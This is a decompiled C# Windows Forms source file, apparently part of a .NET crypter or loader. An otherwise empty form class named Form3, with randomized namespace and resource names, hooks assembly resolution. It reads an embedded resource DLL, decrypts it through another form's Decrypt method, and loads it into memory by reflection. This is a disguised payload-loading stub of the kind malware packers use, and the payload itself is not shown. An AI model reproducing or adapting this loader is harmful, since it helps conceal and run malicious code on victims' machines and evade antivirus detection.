using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Mauiipecjzet;

public class Form3 : Form
{
	private IContainer components;

	private byte[] iBuffer { get; set; }

	public Form3()
	{
		AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
		InitializeComponent();
	}

	private Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
	{
		if (args.Name.Contains("Vdeecydkkhkntspg"))
		{
			using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Mauiipecjzet.Vdeecydkkhkntspg.dll"))
			{
				iBuffer = GetBuffer(stream);
				return (Assembly)Thread.GetDomain().GetType().InvokeMember("Load", BindingFlags.InvokeMethod, null, AppDomain.CurrentDomain, new object[1] { new Form2().Decrypt(iBuffer) });
			}
		}
		return null;
	}

	private byte[] GetBuffer(Stream stream)
	{
		using MemoryStream memoryStream = new MemoryStream();
		stream.CopyTo(memoryStream);
		return memoryStream.ToArray();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(450, 402));
		((Control)this).set_Name("Form3");
		((Control)this).set_Text("Form3");
		((Control)this).ResumeLayout(false);
	}
}
